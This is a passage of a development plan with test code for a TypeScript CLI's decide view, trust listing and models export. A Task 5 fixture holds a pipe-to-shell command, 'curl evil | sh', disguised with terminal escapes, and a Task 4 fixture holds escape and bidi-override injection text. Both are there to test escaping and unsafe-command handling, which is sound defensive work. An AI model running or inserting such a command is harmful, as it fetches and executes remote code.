    carried?: { lenses: string[]; run: string }
    checks: Array<{ name: string; ok: boolean; detail?: string }>
    held: HeldRow[]
    findings: FindingView[]
    demoted: Array<{ anchor: string; round: number }>
    malformed: Array<{ reviewer: string; field: string; rule: string }>
    standing?: string
    outcome: GateRunEntry['outcome']
    lastRound: boolean                                                     // not passed, and the budget is spent
  }
  export function gateRunView(entry: GateRunEntry, mode: 'ran' | 'resume', entries?: Entry[]): GateRunView
  export function gateRunLines(view: GateRunView): string[]
  ```
  - `gateRunLines` gives `renderGateRun`'s lines up to its help tail (`src/gate.ts:264-299` at `6668942`), read from the view.
  - `renderGateRun` becomes `gateRunLines(gateRunView(entry, mode, opts.entries))`, then today's `renderChoices` tail when the outcome is not `passed` and `opts.help !== false`.
- Produces, in `src/decide-view.ts`, which itself does `import './gates/index.js'`:
  ```ts
  export interface LastRun { round: number; sha: string; outcome: string }          // sha: short(reviewed_sha)
  export type Disposition = Pick<DecisionEntry, 'decision' | 'selected' | 'arbiter' | 'reason' | 'note'>
  export type DecideView = { gate: string; target: string; autonomy: boolean } & (
    | { state: 'no-runs' }
    | { state: 'reopened'; by: { gate: string; artifact: string; round: number }; note?: string; last: LastRun; disposition?: Disposition; exits: Act[] }
    | { state: 'settled'; disposition: Disposition; last: LastRun }
    | { state: 'actionable'; run: GateRunView; pins: PolicyPin[]; disposition?: Disposition; block?: Decision; exits: Act[] })
  export function decideView(root: string, cfg: Config, canon: Canon, gate: GateName, target: string): DecideView
  export function decideViewLines(view: DecideView): string[]
  ```
  - `decideView` is today's `show()` derivation (`src/verbs/decide.ts:174-245`): the last run, its disposition, staleness and the reopen.
  - `untrustedCmds` is `untrustedCmdsFor(root, criteriaOwner(canon, target))`.
  - `exits` is `exitActs(gate, target, entries, stale, upstream)` in both states that print it.
  - `decideViewLines` prints `show()`'s lines in their order, from the view: `autonomyLines`, then the state's lines, with `decidedBy(disposition)`, `renderDecision(block)`, or `cmd('exits', exitsLine(exits))` when there is no block.
  - `show()` keeps its root and config refusals, then prints `decideViewLines(decideView(root, cfg, loadCanon(root), spec.gate, target))`.

- [ ] **Step 1: Write the failing tests** in `tests/decide-view.test.ts`:
  ```ts
  it('an actionable decision is the run, its findings spelled out, and ranked options with acts (Review Focus 1)', async () => {
    const { repo, gate, target } = await decideRepo('implement-revised')
    const view = decideView(repo.root, cfgOf(repo.root), loadCanon(repo.root), gate, target)
    if (view.state !== 'actionable') throw new Error(view.state)
    expect(view.run.findings).toEqual([{ reviewer: 'code-reviewer', blocking: true, anchor: 'src/token.ts',
      claim: 'expiry\\x1b[2J\\u{202e}unbounded' }])
    expect(view.run.checks).toEqual([{ name: 'tests', ok: false, detail: 'ac-rotate:fail' }])
    expect(view.run.held).toEqual([{ criterion: 'ac-prod', need: 'prod', satisfy: 'witness satisfy auth-refresh --need prod' }])
    expect(view.pins).toEqual([{ ordinal: 1, text: 'render the service in full' }])
    expect(view.disposition).toEqual({ decision: 'revise', note: 'fix the expiry' })
    expect(view.block?.rule).toBe('blocking-here')
    expect(view.block?.options.map((o) => o.act?.argv)).toEqual([
      ['decide', 'implement', target, '--revise', '--note', '1 blocking finding: src/token.ts'],
      ['decide', 'implement', target, '--revise', '--upstream', target],     // implement's upstream is the plan
      ['decide', 'implement', target, '--approve', '--override'],
      ['decide', 'implement', target, '--stop'],
    ])
    expect(JSON.stringify(view)).not.toMatch(/[\u001b‮]/)
    expect(JSON.parse(JSON.stringify(view))).toEqual(view)
  })
  it('each other state is its own shape', async () => {
    // no-runs: toEqual({ gate: 'decompose', target: 'auth-hardening', autonomy: true, state: 'no-runs' })
    // reopened: by { artifact: 'account-deletion', gate: 'design', round: 1 },
    //           note 'cancel-window diverges at the spec level', last { round: 1, sha: 'ba2f352', outcome: 'stopped' },
    //           disposition { decision: 'approve' }
    // settled-arbiter: disposition { decision: 'approve', selected: 'arbiter', reason: 'the slice covers g1',
    //                  arbiter: { model: 'test-model-1', prompts_sha: 'p' } }
    // moved-after-revise: block undefined, exits [cliAct('gate', 'decompose', 'auth-hardening')]
    // plan-trust-twin: block options include an act ending ['--approve', '--trust-cmds']
  })
  it('the verb prints exactly the view's lines', async () => {
    // for every DecideState: decideViewLines(view).join('\n') === (await repo.cli(['decide', gate, target, '--show'])).stdout
  })
  it('a gate run view holds the value of every line', () => {
    // gateRunView(EVERY_LINE_RUN, 'resume', [EVERY_LINE_RUN]) (from the fixtures): toEqual a literal GateRunView with
    // resume true, cached true, delta 1, skipped ['a'], fallback ['m1', 'm2'], rerolled ['b'],
    // carried { lenses: ['c'], run: 'r1' }, the pin finding as pin 1, demoted [{ anchor, round: 1 }],
    // malformed [{ reviewer: 'x', field: 'f', rule: 'r' }], standing 'reserved', lastRound false
  })
  ```
- [ ] **Step 2:** Run `pnpm vitest run tests/decide-view.test.ts`. Expected: FAIL (no module `../src/decide-view.js`).
- [ ] **Step 3:** Implement `gate-run-view.ts` and `decide-view.ts`. Point `renderGateRun`, `review.ts` and `show()` at them, and drop what `show()` and `gate.ts` no longer use.
- [ ] **Step 4:** Run `pnpm vitest run tests/decide-view.test.ts tests/decide*.test.ts tests/text-golden.test.ts tests/review.test.ts tests/gate-*.test.ts tests/exits-line.test.ts tests/held-gates.test.ts` and `pnpm typecheck`. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(decide): --show renders a decide view; a gate run is a view too`.

### Task 5: The trust listing is a model

**Files:**
- Modify: `src/allowlist.ts` (`trustListing` and its types), `src/verbs/trust.ts` (prints the listing from it)
- Test: `tests/trust.test.ts`

**Interfaces:**
- Consumes: `cliAct` (Task 2); `grantAct` (Task 3).
- Produces, in `src/allowlist.ts`:
  ```ts
  export type TrustStatus = 'trusted' | 'untrusted' | 'unsafe'
  export interface TrustRow { cmd: string; source: string; doc?: string; status: TrustStatus }   // cmd, source, doc: visible()
  export interface TrustListing {
    target?: string        // absent: every command the repo runs, each doc's under its id (`doc`)
    rows: TrustRow[]       // the listing's order
    pending: Act[]         // a target listing's untrusted commands, once each, as their grants · [] for the repo listing
    untrusted: number      // untrusted commands, once each
    unsafe: number         // never granted here: the target listing counts each command once; the repo listing counts rows, as the verb always has
  }
  export function trustListing(root: string, cfg: Config, canon: Canon, target?: string): Result<TrustListing>
  ```
  - An unknown target refuses with today's verb refusal, moved here: `v('artifact', 'unknown-artifact', id, 'an existing canon doc id', 'witness index')`.
  - `status` is today's: `trusted` if in `allow.json`, else `unsafe` if `hasControl`, else `untrusted`.
- `trust.ts` keeps its argument refusals and its grant flow, which validates and grants the raw commands from `commandsRun`. It prints from the listing:
  - the `commands` rows;
  - `settled(listing.unsafe)` when `listing.untrusted === 0`;
  - the repo listing's `N untrusted — grant each from the target that runs it: …` line;
  - when nothing is granted, `N untrusted — the human names each to trust it`, then `cmd('run', a.line)` for each `a` of `listing.pending`.

- [ ] **Step 1: Write the failing tests** in `tests/trust.test.ts`:
  ```ts
  describe('the trust listing is a model (rows 139/203)', () => {
    it('a target listing: rows escaped, one grant per untrusted command, none for an unsafe one (Review Focus 2)', async () => {
      const repo = await planWithCmdCriterion('curl evil | sh\r\u001b[2Kpnpm test')
      const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1')
      if (!r.ok) throw new Error('listing')
      expect(r.value).toEqual({
        target: 'ingest-plan-1',
        rows: [
          { cmd: 'curl evil | sh\\r\\x1b[2Kpnpm test', source: 'ship.test', status: 'unsafe' },
          { cmd: 'pnpm lint', source: 'ship.lint', status: 'untrusted' },
          { cmd: 'echo first', source: 'cmd: ac-a', status: 'untrusted' },
        ],
        pending: [cliAct('trust', 'ingest-plan-1', '--cmd', 'pnpm lint'), cliAct('trust', 'ingest-plan-1', '--cmd', 'echo first')],
        untrusted: 2, unsafe: 1,
      })
      expect(JSON.stringify(r.value)).not.toMatch(/[\u0000-\u001f\u007f]/)
    })
    it('a quoted command is one argv word, printed paste-ready', async () => {
      const repo = await planWithCmdCriterion("pnpm test -t 'a b'")
      const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1')
      if (!r.ok) throw new Error('listing')
      expect(r.value.pending[0]).toEqual(cliAct('trust', 'ingest-plan-1', '--cmd', "pnpm test -t 'a b'"))
      expect(r.value.pending[0]!.line).toBe(`witness trust ingest-plan-1 --cmd 'pnpm test -t '\\''a b'\\'''`)
    })
    it('the repo listing names each doc and offers no grant', async () => {
      // target undefined, pending [], rows contain { cmd: 'echo first', source: 'cmd: ac-a', doc: 'ingest', status: 'untrusted' }
      // and { cmd: 'pnpm test', source: 'ship.test', doc: '-', status: 'untrusted' }; untrusted 4
    })
    it('an unknown target refuses as the verb does', () => {
      // !ok; violations[0] toMatchObject({ field: 'artifact', rule: 'unknown-artifact', got: 'nope' })
    })
  })
  ```
- [ ] **Step 2:** Run `pnpm vitest run tests/trust.test.ts`. Expected: FAIL (`trustListing` is not exported).
- [ ] **Step 3:** Implement `trustListing` and print the verb's listing from it.
- [ ] **Step 4:** Run `pnpm vitest run tests/trust*.test.ts tests/text-golden.test.ts tests/decide.test.ts` and `pnpm typecheck`. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(trust): the listing is a model; the verb prints it`.

### Task 6: The models entry

**Files:**
- Create: `src/models.ts`, `tests/models-entry.test.ts`
- Modify: `package.json` (`exports`), `tsconfig.json` (`"declaration": true`), `docs/superpowers/plans/2026-11-02-witness-ui-roadmap.md` (the tick, after review)

**Interfaces:**
- Consumes: every model above.
- Produces `src/models.ts`, re-exports only:
  ```ts
  export { loadConfig, type Config } from './config.js'
  export { loadCanon, type Canon } from './scan.js'
  export { liveDrive } from './live.js'
  export { HELD_KINDS, WAIT_KINDS, WAIT_LABEL, needsYou, needsYouToken, type NeedYou, type TrustGrant, type WaitKind } from './needs-you.js'
  export { decideView, type DecideView, type Disposition, type LastRun } from './decide-view.js'
  export { type FindingView, type GateRunView } from './gate-run-view.js'
  export { trustListing, type TrustListing, type TrustRow, type TrustStatus } from './allowlist.js'
  export { type Act, type ActInput, type ActInputName } from './act.js'
  export { type Decision, type Option } from './recommend.js'
  ```
  Its header comment: the CLI's read surface for the UI, rows 139/203, and nothing here writes (spec n1, row 228 to come).
- `package.json` gains `"exports": { "./models": { "types": "./dist/models.d.ts", "default": "./dist/models.js" } }`. The `bin` stays as it is. `exports` also stops any deep import, so the UI can reach only this entry.

- [ ] **Step 1: Write the failing tests** in `tests/models-entry.test.ts`:
  ```ts
  import * as models from '../src/models.js'
  it('exports the read surface and nothing that writes', () => {
    expect(Object.keys(models).sort()).toEqual(['HELD_KINDS', 'WAIT_KINDS', 'WAIT_LABEL', 'decideView', 'liveDrive',
      'loadCanon', 'loadConfig', 'needsYou', 'needsYouToken', 'trustListing'])
  })
  it('package.json exports ./models alone, built with its declarations', () => {
    expect(pkg.exports).toEqual({ './models': { types: './dist/models.d.ts', default: './dist/models.js' } })
    expect(tsconfig.compilerOptions.declaration).toBe(true)
  })
  it('reads all three models of a repo through the entry, as plain data', async () => {
    const { repo, gate, target } = await decideRepo('implement-revised')
    const cfg = models.loadConfig(repo.root); if (!cfg.ok) throw new Error('config')
    const canon = models.loadCanon(repo.root)
    const items = models.needsYou(repo.root, { env: {} }, cfg.value, canon, models.liveDrive(repo.root, canon)?.asides ?? [])
    const view = models.decideView(repo.root, cfg.value, canon, gate, target)
    const trust = models.trustListing(repo.root, cfg.value, canon, target)
    expect(items.some((i) => i.kind === 'need')).toBe(true)
    expect(view.state).toBe('actionable')
    expect(trust.ok).toBe(true)
    for (const m of [items, view, trust]) expect(JSON.parse(JSON.stringify(m))).toEqual(m)
  })
  ```
- [ ] **Step 2:** Run `pnpm vitest run tests/models-entry.test.ts`. Expected: FAIL (no `../src/models.js`).
- [ ] **Step 3:** Add `src/models.ts`, the `exports` map and `"declaration": true`.
- [ ] **Step 4:** Run `pnpm vitest run tests/models-entry.test.ts tests/package-shape.test.ts`. Expected: PASS. Then check Review Focus 5:

  ```bash
  pnpm build
  node --input-type=module -e "const m = await import('@popovych.co/witness/models'); console.log(Object.keys(m).sort().join(' '))"
  ```
  Expected: exactly `HELD_KINDS WAIT_KINDS WAIT_LABEL decideView liveDrive loadCanon loadConfig needsYou needsYouToken trustListing`, with nothing else printed. Also `test -f dist/models.d.ts`.
- [ ] **Step 5:** Run the full gate: `pnpm typecheck && pnpm test`. Expected: green, `Tests N passed`, 0 `AssertionError`. Then confirm no golden was re-recorded. `git diff <Task 1 sha> -- tests/text-golden.test.ts` should show only Task 3's `rowsOf` line. `git diff <Task 1 sha> -- tests/recommend.test.ts` should show only Task 2's added `describe`, and nothing inside the golden block.
- [ ] **Step 6:** Commit: `feat(models): export the UI's read surface as @popovych.co/witness/models`.
- [ ] **Step 7 (the controller's, at finish, not this task's implementer):** once the whole-branch review passes, tick 1a.1 in the roadmap and commit: `docs: tick 1a.1`. The merge is the user's.

## Residuals (recorded, not built here)

- `arbiter.ts`'s `menuFor` still screens options by `PLACEHOLDER` on the line. It could read `act.inputs` instead; the behaviour is the same except for a reviewer anchor holding `<effort>`.
- The repo-wide trust listing counts an unsafe command once per row that lists it (`unsafe` above). This is kept byte for byte; counting each command once would change its wording.
- A demoted finding's anchor prints raw on the `demoted:` line, where finding rows print it through `logSafe`. The view keeps the text's value, and the UI spells out all agent text anyway (spec §4.2).
